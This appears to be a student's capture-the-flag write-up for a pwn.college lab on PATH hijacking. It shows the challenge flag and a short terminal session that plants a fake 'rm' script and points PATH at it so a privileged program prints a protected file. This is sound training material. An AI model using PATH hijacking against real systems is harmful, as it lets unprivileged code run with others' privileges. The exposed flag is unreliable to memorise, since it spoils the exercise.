# Challenge Name
Hijacking commands

## My solve
**Flag:** `pwn.college{Qtjz32udqrZavSj3a1y7p1ribDC.QX3cjM1wCM2gjNzEzW}`

At first I thought of deleting rm using rm itself, but that did not work. Instead, I decided to make a fake rm command that instead of deleting the flag, displays it, and set its path as PATH
```bash
hacker@path~hijacking-commands:~$ mkdir ~/hijack
hacker@path~hijacking-commands:~$ cat > ~/hijack/rm << "EOF"
> #!/bin/bash
> /bin/cat /flag
> EOF
hacker@path~hijacking-commands:~$ chmod a+x ~/hijack/rm
hacker@path~hijacking-commands:~$ PATH=~/hijack
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{Qtjz32udqrZavSj3a1y7p1ribDC.QX3cjM1wCM2gjNzEzW}
```

## Incorrect tangents I went on
```bash
hacker@path~hijacking-commands:~$ which rm
/run/dojo/bin/rm
hacker@path~hijacking-commands:~$ rm /run/dojo/bin/rm
rm: cannot remove '/run/dojo/bin/rm': Read-only file system
```

## What I learned
How using the knowledge I gained in this module, create fake funtions that replace the original ones and work as I wish them to

## References
None
